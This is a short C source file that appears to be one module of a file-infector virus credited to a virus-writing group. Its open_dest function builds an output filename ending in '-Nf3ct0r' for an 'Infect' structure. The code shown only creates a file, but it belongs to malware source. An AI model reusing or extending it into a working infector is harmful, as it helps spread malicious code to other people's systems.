/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/*
     Description : open_dest just creates a new file ending with *suffix* see the code...
*/


#include "defines.h"

int open_dest(Infect *file)
{
	enum { FLAGS= O_WRONLY | O_CREAT | O_TRUNC };     /* flags for open() */
	const char *base;
	static const char suffix[]="-Nf3ct0r";           /* our suffix */
	char *dest_file;
	size_t len;
	
	/* nice implentation how to create a new file name using
	   the original base name and a suffix 
	*/
	
	base=strrchr(file->src_f,'/');
	base=(base==0) ? file->src_f: base+1;
	
	len=strlen(base);
	
	/* allocating memory for new file name */
        dest_file=(char*)malloc(len+sizeof(suffix));
	if(dest_file==0) return false;
	
	memcpy(dest_file,base,len);
	memcpy(dest_file+len,suffix,sizeof(suffix));
	
	if((file->fd_dest=open(dest_file,FLAGS,0775))<0) return false;
	
	free(dest_file);
	
	return true;

}
